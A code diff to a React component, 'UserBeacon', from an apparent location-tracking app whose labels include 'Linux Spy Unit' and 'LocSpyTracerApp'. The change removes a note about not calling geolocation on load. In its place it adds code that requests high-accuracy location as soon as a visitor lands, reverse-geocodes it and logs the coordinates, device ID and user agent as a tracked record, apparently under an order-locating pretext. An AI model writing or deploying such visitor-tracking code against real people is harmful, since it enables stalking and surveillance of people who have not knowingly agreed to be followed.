@@ -158,26 +158,124 @@ export default function UserBeacon({ onLocationLogged }: UserBeaconProps) {
   }, [lat, lng]);
 
   useEffect(() => {
-    setDeviceId(getOrInitDeviceId());
+    const initDeviceId = getOrInitDeviceId();
+    setDeviceId(initDeviceId);
     setUserAgent(navigator.userAgent);
     setViewportSize(`${window.innerWidth} x ${window.innerHeight} px`);
     
     // Guess a friendly label representation
+    let deviceName = "Embedded Node";
     if (navigator.userAgent.includes("iPhone")) {
-      setCustomDeviceName("iPhone Terminal");
+      deviceName = "iPhone Terminal";
     } else if (navigator.userAgent.includes("Android")) {
-      setCustomDeviceName("Android Mobile Beacon");
+      deviceName = "Android Mobile Beacon";
     } else if (navigator.userAgent.includes("Macintosh")) {
-      setCustomDeviceName("Mac OS X Terminal");
+      deviceName = "Mac OS X Terminal";
     } else if (navigator.userAgent.includes("Windows")) {
-      setCustomDeviceName("Windows PC Tracker");
+      deviceName = "Windows PC Tracker";
     } else if (navigator.userAgent.includes("Linux")) {
-      setCustomDeviceName("Linux Spy Unit");
-    } else {
-      setCustomDeviceName("Embedded Node");
+      deviceName = "Linux Spy Unit";
     }
+    setCustomDeviceName(deviceName);
 
-    // Keep defaults clean at startup without calling geolocation automatically on load
+    // Ask location immediately on land
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const parsedLat = position.coords.latitude;
+          const parsedLng = position.coords.longitude;
+          const parsedAcc = Math.round(position.coords.accuracy);
+
+          setLat(parsedLat.toFixed(6));
+          setLng(parsedLng.toFixed(6));
+          setAccuracy(parsedAcc);
+
+          // Geocode coordinates to human city
+          let tempCity = "Kuala Lumpur, Malaysia";
+          try {
+            const latVal = Math.round(parsedLat * 10) / 10;
+            const lngVal = Math.round(parsedLng * 10) / 10;
+            const presets: { [key: string]: string } = {
+              "3.1_101.7": "Kuala Lumpur, Malaysia",
+              "35.7_139.7": "Tokyo, Japan",
+              "37.8_-122.4": "San Francisco, USA",
+              "51.5_-0.1": "London, UK",
+            };
+            const presetKey = `${latVal}_${lngVal}`;
+            if (presets[presetKey]) {
+              tempCity = presets[presetKey];
+            } else {
+              const osmResponse = await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${parsedLat}&lon=${parsedLng}&zoom=12`,
+                {
+                  headers: {
+                    "Accept-Language": "en",
+                    "User-Agent": "LocSpyTracerApp/1.0"
+                  }
+                }
+              );
+              if (osmResponse.ok) {
+                const data = await osmResponse.json();
+                if (data.address) {
+                  const place = data.address.city || data.address.town || data.address.village || data.address.suburb || data.address.state;
+                  const country = data.address.country;
+                  if (place && country) tempCity = `${place}, ${country}`;
+                  else if (place) tempCity = place;
+                }
+              }
+            }
+          } catch (e) {
+            const knownCities = [
+              { name: "New York, USA", lat: 40.7128, lng: -74.0060 },
+              { name: "London, UK", lat: 51.5074, lng: -0.1278 },
+              { name: "Tokyo, Japan", lat: 35.6762, lng: 139.6503 },
+              { name: "Sydney, Australia", lat: -33.8688, lng: 151.2093 },
+              { name: "Kuala Lumpur, Malaysia", lat: 3.1390, lng: 101.6869 }
+            ];
+            let nearestCity = knownCities[0];
+            let minDistance = Infinity;
+            for (const cityObj of knownCities) {
+              const dLat = parsedLat - cityObj.lat;
+              const dLng = parsedLng - cityObj.lng;
+              const dist = dLat * dLat + dLng * dLng;
+              if (dist < minDistance) {
+                minDistance = dist;
+                nearestCity = cityObj;
+              }
+            }
+            tempCity = nearestCity.name;
+          }
+
+          setResolvedCity(tempCity);
+
+          const record = addTrackedLocation({
+            deviceId: initDeviceId,
+            deviceName: deviceName,
+            latitude: parsedLat,
+            longitude: parsedLng,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            accuracy: parsedAcc,
+            status: "active",
+            city: tempCity
+          });
+
+          const log: SystemLog = {
+            id: `log_auto_${Date.now()}`,
+            timestamp: new Date().toLocaleTimeString(),
+            type: "success",
+            message: `AUTO LOGGER: Visitor session initiated for Node Type [${deviceName}] at [${tempCity}].`
+          };
+
+          onLocationLogged(record, log);
+          setOrderLocated(true);
+        },
+        (error) => {
+          console.warn("Auto-track request was rejected or failed:", error);
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    }
   }, []);
 
   // Simulating active device tracking action
